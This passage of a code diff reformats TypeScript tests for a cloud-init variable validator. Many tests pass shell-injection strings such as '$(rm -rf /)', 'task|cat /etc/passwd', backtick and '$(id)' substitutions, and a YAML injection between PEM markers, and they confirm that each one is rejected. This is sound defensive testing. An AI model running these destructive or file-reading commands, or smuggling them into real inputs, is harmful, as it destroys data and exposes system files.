     it('accepts single properly quoted DNS server', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"1.1.1.1"',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"1.1.1.1"',
+      }))).not.toThrow();
     });
 
     it('rejects DNS server values with invalid IPv4 octets', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"999.999.999.999"',
-          })
-        )
-      ).toThrow('dockerDnsServers');
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"999.999.999.999"',
+      }))).toThrow('dockerDnsServers');
     });
 
     it('rejects non-string JSON values in Docker DNS servers', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            dockerDnsServers: '"1.1.1.1", 8',
-          })
-        )
-      ).toThrow('dockerDnsServers');
+      expect(() => validateCloudInitVariables(baseVariables({
+        dockerDnsServers: '"1.1.1.1", 8',
+      }))).toThrow('dockerDnsServers');
     });
 
     it('collects multiple validation errors', () => {
@@ -1460,17 +1221,14 @@ describe('validateCloudInitVariables', () => {
         expect(msg).toContain('callbackToken');
       }
     });
+
   });
 
   describe('generateCloudInit calls validation', () => {
     it('throws on invalid nodeId before generating config', () => {
-      expect(() =>
-        generateCloudInit(
-          baseVariables({
-            nodeId: '$(rm -rf /)',
-          })
-        )
-      ).toThrow('nodeId');
+      expect(() => generateCloudInit(baseVariables({
+        nodeId: '$(rm -rf /)',
+      }))).toThrow('nodeId');
     });
 
     it('succeeds with valid variables', () => {
@@ -1494,68 +1252,44 @@ describe('validateCloudInitVariables', () => {
       // control_plane_url is embedded in: curl ... "{{ control_plane_url }}/api/agent/..."
       // In bash, $VAR inside double quotes is expanded. SAFE_URL_RE has no $ in its
       // character class, so dollar-sign values are correctly rejected.
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'https://api.example.com/$PATH',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'https://api.example.com/$PATH',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects controlPlaneUrl with $() (prevents command substitution in shell context)', () => {
       // $(id) in a double-quoted bash string causes command substitution — RCE.
       // SAFE_URL_RE correctly rejects this because $ is not in the character class.
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'https://api.example.com/$(id)',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'https://api.example.com/$(id)',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects controlPlaneUrl with backtick injection', () => {
       // Backticks are not in SAFE_URL_RE, so this is already rejected.
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            controlPlaneUrl: 'https://api.example.com/`id`',
-          })
-        )
-      ).toThrow('controlPlaneUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        controlPlaneUrl: 'https://api.example.com/`id`',
+      }))).toThrow('controlPlaneUrl');
     });
 
     it('rejects jwksUrl with shell metacharacters', () => {
       // jwksUrl is also embedded in the systemd unit (inside single-quoted heredoc,
       // so lower risk there) but the regex is the same as controlPlaneUrl.
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            jwksUrl: 'https://api.example.com/path`id`',
-          })
-        )
-      ).toThrow('jwksUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        jwksUrl: 'https://api.example.com/path`id`',
+      }))).toThrow('jwksUrl');
     });
 
     it('rejects jwksUrl that is HTTP (non-HTTPS)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            jwksUrl: 'http://api.example.com/.well-known/jwks.json',
-          })
-        )
-      ).toThrow('jwksUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        jwksUrl: 'http://api.example.com/.well-known/jwks.json',
+      }))).toThrow('jwksUrl');
     });
 
     it('rejects jwksUrl that is empty', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            jwksUrl: '',
-          })
-        )
-      ).toThrow('jwksUrl');
+      expect(() => validateCloudInitVariables(baseVariables({
+        jwksUrl: '',
+      }))).toThrow('jwksUrl');
     });
   });
 
@@ -1564,203 +1298,127 @@ describe('validateCloudInitVariables', () => {
     // produce invalid hostnames. cloud-init will accept them but the resulting
     // hostname is non-conforming. These tests document the current behaviour.
     it('currently accepts leading-dot hostname (invalid per RFC 1123, documents known gap)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: '.invalid-hostname',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: '.invalid-hostname',
+      }))).not.toThrow();
     });
 
     it('currently accepts trailing-dot hostname (invalid per RFC 1123, documents known gap)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'hostname.',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'hostname.',
+      }))).not.toThrow();
     });
 
     it('rejects hostname with shell special characters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'host$(cmd)',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'host$(cmd)',
+      }))).toThrow('hostname');
     });
 
     it('rejects hostname with ampersand', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            hostname: 'host&evil',
-          })
-        )
-      ).toThrow('hostname');
+      expect(() => validateCloudInitVariables(baseVariables({
+        hostname: 'host&evil',
+      }))).toThrow('hostname');
     });
   });
 
   describe('optional ID fields shell injection coverage', () => {
     // projectId already has a test; these cover the other SAFE_ID_RE fields.
     it('rejects chatSessionId with command substitution', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            chatSessionId: '$(id)',
-          })
-        )
-      ).toThrow('chatSessionId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        chatSessionId: '$(id)',
+      }))).toThrow('chatSessionId');
     });
 
     it('rejects chatSessionId with semicolon chaining', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            chatSessionId: 'sess; rm -rf /',
-          })
-        )
-      ).toThrow('chatSessionId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        chatSessionId: 'sess; rm -rf /',
+      }))).toThrow('chatSessionId');
     });
 
     it('rejects taskId with command substitution', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            taskId: '$(id)',
-          })
-        )
-      ).toThrow('taskId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        taskId: '$(id)',
+      }))).toThrow('taskId');
     });
 
     it('rejects taskId with pipe', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            taskId: 'task|cat /etc/passwd',
-          })
-        )
-      ).toThrow('taskId');
+      expect(() => validateCloudInitVariables(baseVariables({
+        taskId: 'task|cat /etc/passwd',
+      }))).toThrow('taskId');
     });
   });
 
   describe('journald field coverage', () => {
     it('rejects logJournalKeepFree with invalid format', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalKeepFree: '500MB',
-          })
-        )
-      ).toThrow('logJournalKeepFree');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalKeepFree: '500MB',
+      }))).toThrow('logJournalKeepFree');
     });
 
     it('rejects logJournalKeepFree with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalKeepFree: '500M; rm -rf /',
-          })
-        )
-      ).toThrow('logJournalKeepFree');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalKeepFree: '500M; rm -rf /',
+      }))).toThrow('logJournalKeepFree');
     });
 
     it('rejects logJournalMaxUse with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalMaxUse: '1G$(id)',
-          })
-        )
-      ).toThrow('logJournalMaxUse');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalMaxUse: '1G$(id)',
+      }))).toThrow('logJournalMaxUse');
     });
 
     it('rejects logJournalMaxRetention with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            logJournalMaxRetention: '7day; echo pwned',
-          })
-        )
-      ).toThrow('logJournalMaxRetention');
+      expect(() => validateCloudInitVariables(baseVariables({
+        logJournalMaxRetention: '7day; echo pwned',
+      }))).toThrow('logJournalMaxRetention');
     });
   });
 
   describe('cfIpFetchTimeout edge cases', () => {
     it('rejects cfIpFetchTimeout of zero', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            cfIpFetchTimeout: '0',
-          })
-        )
-      ).toThrow('cfIpFetchTimeout');
+      expect(() => validateCloudInitVariables(baseVariables({
+        cfIpFetchTimeout: '0',
+      }))).toThrow('cfIpFetchTimeout');
     });
 
     it('rejects cfIpFetchTimeout with decimal point', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            cfIpFetchTimeout: '30.5',
-          })
-        )
-      ).toThrow('cfIpFetchTimeout');
+      expect(() => validateCloudInitVariables(baseVariables({
+        cfIpFetchTimeout: '30.5',
+      }))).toThrow('cfIpFetchTimeout');
     });
 
     it('rejects cfIpFetchTimeout with shell metacharacters', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            cfIpFetchTimeout: '30; rm -rf /',
-          })
-        )
-      ).toThrow('cfIpFetchTimeout');
+      expect(() => validateCloudInitVariables(baseVariables({
+        cfIpFetchTimeout: '30; rm -rf /',
+      }))).toThrow('cfIpFetchTimeout');
     });
   });
 
   describe('PEM format validation', () => {
     it('accepts valid certificate PEM', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: REALISTIC_CERT,
-            originCaKey: REALISTIC_KEY,
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: REALISTIC_CERT,
+        originCaKey: REALISTIC_KEY,
+      }))).not.toThrow();
     });
 
     it('accepts empty string for originCaCert (no TLS mode)', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: '',
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: '',
+      }))).not.toThrow();
     });
 
     it('accepts undefined originCaCert', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: undefined,
-          })
-        )
-      ).not.toThrow();
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: undefined,
+      }))).not.toThrow();
     });
 
     it('rejects originCaCert without BEGIN marker', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: 'MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4w',
-          })
-        )
-      ).toThrow('originCaCert');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: 'MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4w',
+      }))).toThrow('originCaCert');
     });
 
     it('rejects originCaCert with YAML injection between markers', () => {
@@ -1770,13 +1428,9 @@ describe('validateCloudInitVariables', () => {
         'key: value',
         '-----END CERTIFICATE-----',
       ].join('\n');
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: malicious,
-          })
-        )
-      ).toThrow('originCaCert');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: malicious,
+      }))).toThrow('originCaCert');
     });
 
     it('rejects originCaKey with shell injection between markers', () => {
@@ -1785,23 +1439,15 @@ describe('validateCloudInitVariables', () => {
         '$(rm -rf /)',
         '-----END RSA PRIVATE KEY-----',
       ].join('\n');
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaKey: malicious,
-          })
-        )
-      ).toThrow('originCaKey');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaKey: malicious,
+      }))).toThrow('originCaKey');
     });
 
     it('rejects originCaCert that is just random text', () => {
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: 'this is not a certificate',
-          })
-        )
-      ).toThrow('originCaCert');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: 'this is not a certificate',
+      }))).toThrow('originCaCert');
     });
 
     it('rejects originCaKey without END marker', () => {
@@ -1809,13 +1455,9 @@ describe('validateCloudInitVariables', () => {
         '-----BEGIN RSA PRIVATE KEY-----',
         'MIIEpAIBAAKCAQEAxvFqof1sMB1yt+eiTk7gSMkJaOWJFx7GCQIDfDs3FtQ2VLJM',
       ].join('\n');
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaKey: incomplete,
-          })
-        )
-      ).toThrow('originCaKey');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaKey: incomplete,
+      }))).toThrow('originCaKey');
     });
 
     it('rejects PEM with mismatched BEGIN/END labels', () => {
@@ -1824,13 +1466,9 @@ describe('validateCloudInitVariables', () => {
         'MIIEojCCA4qgAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL',
         '-----END RSA PRIVATE KEY-----',
       ].join('\n');
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: mismatched,
-          })
-        )
-      ).toThrow('originCaCert');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: mismatched,
+      }))).toThrow('originCaCert');
     });
 
     it('rejects PEM with tab characters in body', () => {
@@ -1839,60 +1477,36 @@ describe('validateCloudInitVariables', () => {
         'MIIEojCCA4qg\tAwIBAgIUP5m7GZWdRHSJRzMPQx8sTOBZjR4wDQYJKoZIhvcNAQEL',
         '-----END CERTIFICATE-----',
       ].join('\n');
-      expect(() =>
-        validateCloudInitVariables(
-          baseVariables({
-            originCaCert: withTab,
-          })
-        )
-      ).toThrow('originCaCert');
+      expect(() => validateCloudInitVariables(baseVariables({
+        originCaCert: withTab,
+      }))).toThrow('originCaCert');
     });
   });
 });
 
 describe('validateCloudInitVariables — devcontainer cache flag', () => {
   it('accepts explicit boolean strings', () => {
-    expect(() =>
-      validateCloudInitVariables(
-        baseVariables({
-          devcontainerCacheEnabled: 'true',
-        })
-      )
-    ).not.toThrow();
-    expect(() =>
-      validateCloudInitVariables(
-        baseVariables({
-          devcontainerCacheEnabled: 'false',
-        })
-      )
-    ).not.toThrow();
+    expect(() => validateCloudInitVariables(baseVariables({
+      devcontainerCacheEnabled: 'true',
+    }))).not.toThrow();
+    expect(() => validateCloudInitVariables(baseVariables({
+      devcontainerCacheEnabled: 'false',
+    }))).not.toThrow();
   });
 
   it('accepts omitted and empty values', () => {
-    expect(() =>
-      validateCloudInitVariables(
-        baseVariables({
-          devcontainerCacheEnabled: undefined,
-        })
-      )
-    ).not.toThrow();
-    expect(() =>
-      validateCloudInitVariables(
-        baseVariables({
-          devcontainerCacheEnabled: '',
-        })
-      )
-    ).not.toThrow();
+    expect(() => validateCloudInitVariables(baseVariables({
+      devcontainerCacheEnabled: undefined,
+    }))).not.toThrow();
+    expect(() => validateCloudInitVariables(baseVariables({
+      devcontainerCacheEnabled: '',
+    }))).not.toThrow();
   });
 
   it('rejects non-boolean devcontainer cache values before systemd injection', () => {
-    expect(() =>
-      validateCloudInitVariables(
-        baseVariables({
-          devcontainerCacheEnabled: 'yes; systemctl stop vm-agent',
-        })
-      )
-    ).toThrow('devcontainerCacheEnabled');
+    expect(() => validateCloudInitVariables(baseVariables({
+      devcontainerCacheEnabled: 'yes; systemctl stop vm-agent',
+    }))).toThrow('devcontainerCacheEnabled');
   });
 });
 
@@ -1912,12 +1526,10 @@ describe('regex injection prevention ($-pattern in replacement values)', () => {
    */
 
   it('realistic PEM cert survives full replacement pipeline intact', () => {
-    const config = generateCloudInit(
-      baseVariables({
-        originCaCert: REALISTIC_CERT,
-        originCaKey: REALISTIC_KEY,
-      })
-    );
+    const config = generateCloudInit(baseVariables({
+      originCaCert: REALISTIC_CERT,
+      originCaKey: REALISTIC_KEY,
+    }));
 
     const parsed = YAML.parse(config);
     const certEntry = parsed.write_files.find(
@@ -2018,15 +1630,11 @@ describe('validateCloudInitVariables — provider field', () => {
   });
 
   it('rejects invalid provider', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ provider: 'aws' }))).toThrow(
-      'provider'
-    );
+    expect(() => validateCloudInitVariables(baseVariables({ provider: 'aws' }))).toThrow('provider');
   });
 
   it('rejects provider with shell metacharacters', () => {
-    expect(() =>
-      validateCloudInitVariables(baseVariables({ provider: 'hetzner; rm -rf /' }))
-    ).toThrow('provider');
+    expect(() => validateCloudInitVariables(baseVariables({ provider: 'hetzner; rm -rf /' }))).toThrow('provider');
   });
 });
 
@@ -2049,14 +1657,10 @@ describe('integrated size validation in generateCloudInit', () => {
     largeKeyLines.push('-----END RSA PRIVATE KEY-----');
     const largeKey = largeKeyLines.join('\n');
 
-    expect(() =>
-      generateCloudInit(
-        baseVariables({
-          originCaCert: largeCert,
-          originCaKey: largeKey,
-        })
-      )
-    ).toThrow('32KB');
+    expect(() => generateCloudInit(baseVariables({
+      originCaCert: largeCert,
+      originCaKey: largeKey,
+    }))).toThrow('32KB');
   });
 
   it('skips size validation when validateSize is false', () => {
@@ -2075,26 +1679,17 @@ describe('integrated size validation in generateCloudInit', () => {
     const largeKey = largeKeyLines.join('\n');
 
     // Should not throw with validateSize: false
-    expect(() =>
-      generateCloudInit(
-        baseVariables({
-          originCaCert: largeCert,
-          originCaKey: largeKey,
-        }),
-        { validateSize: false }
-      )
-    ).not.toThrow();
+    expect(() => generateCloudInit(baseVariables({
+      originCaCert: largeCert,
+      originCaKey: largeKey,
+    }), { validateSize: false })).not.toThrow();
   });
 
   it('does not throw for normal-sized configs (default behavior)', () => {
-    expect(() =>
-      generateCloudInit(
-        baseVariables({
-          originCaCert: REALISTIC_CERT,
-          originCaKey: REALISTIC_KEY,
-        })
-      )
-    ).not.toThrow();
+    expect(() => generateCloudInit(baseVariables({
+      originCaCert: REALISTIC_CERT,
+      originCaKey: REALISTIC_KEY,
+    }))).not.toThrow();
   });
 });
 
@@ -2102,7 +1697,7 @@ describe('swap file configuration', () => {
   /** Find the runcmd entry containing the swap setup script block. */
   function findSwapBlock(parsed: { runcmd: (string | unknown)[] }): string {
     const block = parsed.runcmd.find(
-      (cmd) => typeof cmd === 'string' && cmd.includes('SWAP_SIZE_MB=')
+      (cmd) => typeof cmd === 'string' && cmd.includes('SWAP_SIZE_MB='),
     );
     return (block as string) ?? '';
   }
@@ -2117,16 +1712,17 @@ describe('swap file configuration', () => {
 
     // Check sysctl.d persistence file
     const sysctlFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf',
     );
     expect(sysctlFile).toBeDefined();
     expect(sysctlFile.content).toContain('vm.swappiness=60');
   });
 
   it('accepts custom swap values', () => {
-    const config = generateCloudInit(baseVariables({ swapSizeMb: '4096', swapSwappiness: '10' }), {
-      validateSize: false,
-    });
+    const config = generateCloudInit(
+      baseVariables({ swapSizeMb: '4096', swapSwappiness: '10' }),
+      { validateSize: false },
+    );
     const parsed = YAML.parse(config);
 
     const swapBlock = findSwapBlock(parsed);
@@ -2134,13 +1730,16 @@ describe('swap file configuration', () => {
     expect(swapBlock).toContain('SWAP_SWAPPINESS="10"');
 
     const sysctlFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf',
     );
     expect(sysctlFile.content).toContain('vm.swappiness=10');
   });
 
   it('disables swap when swapSizeMb is "0"', () => {
-    const config = generateCloudInit(baseVariables({ swapSizeMb: '0' }), { validateSize: false });
+    const config = generateCloudInit(
+      baseVariables({ swapSizeMb: '0' }),
+      { validateSize: false },
+    );
     const parsed = YAML.parse(config);
 
     const swapBlock = findSwapBlock(parsed);
@@ -2150,13 +1749,14 @@ describe('swap file configuration', () => {
   });
 
   it('generates sysctl persistence file in write_files', () => {
-    const config = generateCloudInit(baseVariables({ swapSwappiness: '80' }), {
-      validateSize: false,
-    });
+    const config = generateCloudInit(
+      baseVariables({ swapSwappiness: '80' }),
+      { validateSize: false },
+    );
     const parsed = YAML.parse(config);
 
     const sysctlFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf',
     );
     expect(sysctlFile).toBeDefined();
     expect(sysctlFile.permissions).toBe('0644');
@@ -2169,10 +1769,10 @@ describe('swap file configuration', () => {
 
     const runcmd = parsed.runcmd as string[];
     const swapIdx = runcmd.findIndex(
-      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: swap-setup')
+      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: swap-setup'),
     );
     const agentIdx = runcmd.findIndex(
-      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: vm-agent-download')
+      (cmd) => typeof cmd === 'string' && cmd.includes('PHASE START: vm-agent-download'),
     );
     expect(swapIdx).toBeGreaterThan(-1);
     expect(agentIdx).toBeGreaterThan(-1);
@@ -2180,56 +1780,59 @@ describe('swap file configuration', () => {
   });
 
   it('rejects non-numeric swapSizeMb', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ swapSizeMb: '2G' }))).toThrow(
-      'swapSizeMb'
-    );
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '2G' })),
+    ).toThrow('swapSizeMb');
   });
 
   it('rejects shell metacharacters in swapSizeMb', () => {
     expect(() =>
-      validateCloudInitVariables(baseVariables({ swapSizeMb: '2048; rm -rf /' }))
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '2048; rm -rf /' })),
     ).toThrow('swapSizeMb');
   });
 
   it('rejects out-of-range swapSizeMb (>65536)', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ swapSizeMb: '99999' }))).toThrow(
-      'swapSizeMb'
-    );
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '99999' })),
+    ).toThrow('swapSizeMb');
   });
 
   it('rejects out-of-range swapSwappiness (>100)', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ swapSwappiness: '150' }))).toThrow(
-      'swapSwappiness'
-    );
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSwappiness: '150' })),
+    ).toThrow('swapSwappiness');
   });
 
   it('rejects non-numeric swapSwappiness', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ swapSwappiness: 'high' }))).toThrow(
-      'swapSwappiness'
-    );
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ swapSwappiness: 'high' })),
+    ).toThrow('swapSwappiness');
   });
 
   it('rejects shell metacharacters in swapSwappiness', () => {
     expect(() =>
-      validateCloudInitVariables(baseVariables({ swapSwappiness: '60; rm -rf /' }))
+      validateCloudInitVariables(baseVariables({ swapSwappiness: '60; rm -rf /' })),
     ).toThrow('swapSwappiness');
   });
 
   it('accepts boundary values (swapSizeMb=0, swapSwappiness=0 and 100)', () => {
     expect(() =>
-      validateCloudInitVariables(baseVariables({ swapSizeMb: '0', swapSwappiness: '0' }))
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '0', swapSwappiness: '0' })),
     ).not.toThrow();
     expect(() =>
-      validateCloudInitVariables(baseVariables({ swapSizeMb: '65536', swapSwappiness: '100' }))
+      validateCloudInitVariables(baseVariables({ swapSizeMb: '65536', swapSwappiness: '100' })),
     ).not.toThrow();
   });
 
   it('still writes sysctl.d with default swappiness when swap is disabled', () => {
-    const config = generateCloudInit(baseVariables({ swapSizeMb: '0' }), { validateSize: false });
+    const config = generateCloudInit(
+      baseVariables({ swapSizeMb: '0' }),
+      { validateSize: false },
+    );
     const parsed = YAML.parse(config);
 
     const sysctlFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf'
+      (f: { path: string }) => f.path === '/etc/sysctl.d/99-sam-swap.conf',
     );
     expect(sysctlFile).toBeDefined();
     expect(sysctlFile.content.trim()).toBe('vm.swappiness=60');
@@ -2252,36 +1855,33 @@ describe('deployment role support', () => {
         deployComposeCmd: '/usr/local/bin/docker compose',
         deployHealthTimeout: '7m',
       }),
-      { validateSize: false }
+      { validateSize: false },
     );
     const parsed = YAML.parse(config);
 
     const unitFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service',
     );
     expect(unitFile).toBeDefined();
     expect(unitFile.content).toContain('Environment=ROLE=deployment');
     expect(unitFile.content).toContain('Environment=NODE_ROLE=deployment');
     expect(unitFile.content).toContain('Environment=ENVIRONMENT_ID=env-abc123');
-    expect(unitFile.content).toContain(
-      'Environment=DEPLOY_SIGNING_PUB_KEY=deploy-pub-key-abc123+/='
-    );
+    expect(unitFile.content).toContain('Environment=DEPLOY_SIGNING_PUB_KEY=deploy-pub-key-abc123+/=');
     expect(unitFile.content).toContain('Environment=DEPLOY_ACME_EMAIL=ops@example.com');
-    expect(unitFile.content).toContain(
-      'Environment=DEPLOY_ACME_CA=https://acme-staging-v02.api.letsencrypt.org/directory'
-    );
-    expect(unitFile.content).toContain(
-      'Environment="DEPLOY_COMPOSE_CMD=/usr/local/bin/docker compose"'
-    );
+    expect(unitFile.content).toContain('Environment=DEPLOY_ACME_CA=https://acme-staging-v02.api.letsencrypt.org/directory');
+    expect(unitFile.content).toContain('Environment="DEPLOY_COMPOSE_CMD=/usr/local/bin/docker compose"');
     expect(unitFile.content).toContain('Environment=DEPLOY_HEALTH_TIMEOUT=7m');
   });
 
   it('leaves deployment environment empty when not specified', () => {
-    const config = generateCloudInit(baseVariables(), { validateSize: false });
+    const config = generateCloudInit(
+      baseVariables(),
+      { validateSize: false },
+    );
     const parsed = YAML.parse(config);
 
     const unitFile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service'
+      (f: { path: string }) => f.path === '/etc/systemd/system/vm-agent.service',
     );
     expect(unitFile).toBeDefined();
     // Empty string values — vm-agent ignores empty env vars
@@ -2298,7 +1898,7 @@ describe('deployment role support', () => {
   it('generates valid YAML with deployment role set', () => {
     const config = generateCloudInit(
       baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
-      { validateSize: false }
+      { validateSize: false },
     );
 
     // Must parse without error
@@ -2313,12 +1913,12 @@ describe('deployment role support', () => {
   it('writes an initial managed Caddyfile for deployment routing', () => {
     const config = generateCloudInit(
       baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
-      { validateSize: false }
+      { validateSize: false },
     );
     const parsed = YAML.parse(config);
 
     const caddyfile = parsed.write_files.find(
-      (f: { path: string }) => f.path === '/etc/caddy/Caddyfile'
+      (f: { path: string }) => f.path === '/etc/caddy/Caddyfile',
     );
     expect(caddyfile).toBeDefined();
     expect(caddyfile.permissions).toBe('0644');
@@ -2332,7 +1932,7 @@ describe('deployment role support', () => {
   it('guards Caddy path preparation behind ROLE=deployment', () => {
     const config = generateCloudInit(
       baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
-      { validateSize: false }
+      { validateSize: false },
     );
     const parsed = YAML.parse(config);
     const runcmd = parsed.runcmd.join('\n');
@@ -2348,7 +1948,7 @@ describe('deployment role support', () => {
   it('starts vm-agent before non-blocking deployment Caddy path setup', () => {
     const config = generateCloudInit(
       baseVariables({ role: 'deployment', environmentId: 'env-deploy-xyz' }),
-      { validateSize: false }
+      { validateSize: false },
     );
     const parsed = YAML.parse(config);
     const runcmd = parsed.runcmd.join('\n');
@@ -2356,45 +1956,53 @@ describe('deployment role support', () => {
     expect(runcmd.indexOf('PHASE START: vm-agent-start')).toBeGreaterThan(-1);
     expect(runcmd.indexOf('PHASE START: caddy-setup')).toBeGreaterThan(-1);
     expect(runcmd.indexOf('PHASE START: vm-agent-start')).toBeLessThan(
-      runcmd.indexOf('PHASE START: caddy-setup')
+      runcmd.indexOf('PHASE START: caddy-setup'),
     );
   });
 
   it('rejects invalid role values', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ role: 'admin' }))).toThrow('role');
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ role: 'admin' })),
+    ).toThrow('role');
 
-    expect(() => validateCloudInitVariables(baseVariables({ role: 'worker' }))).toThrow('role');
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ role: 'worker' })),
+    ).toThrow('role');
   });
 
   it('accepts valid role values', () => {
-    expect(() => validateCloudInitVariables(baseVariables({ role: 'workspace' }))).not.toThrow();
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ role: 'workspace' })),
+    ).not.toThrow();
 
-    expect(() => validateCloudInitVariables(baseVariables({ role: 'deployment' }))).not.toThrow();
+    expect(() =>
+      validateCloudInitVariables(baseVariables({ role: 'deployment' })),
+    ).not.toThrow();
   });
 
   it('rejects environmentId with shell metacharacters', () => {
     expect(() =>
-      validateCloudInitVariables(baseVariables({ environmentId: 'env-123; rm -rf /' }))
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-123; rm -rf /' })),
     ).toThrow('environmentId');
 
     expect(() =>
-      validateCloudInitVariables(baseVariables({ environmentId: 'env-$(whoami)' }))
+      validateCloudInitVariables(baseVariables({ environmentId: 'env-$(whoami)' })),
     ).toThrow('environmentId');
   });
 
   it('accepts valid environmentId values', () => {
     expect(() =>
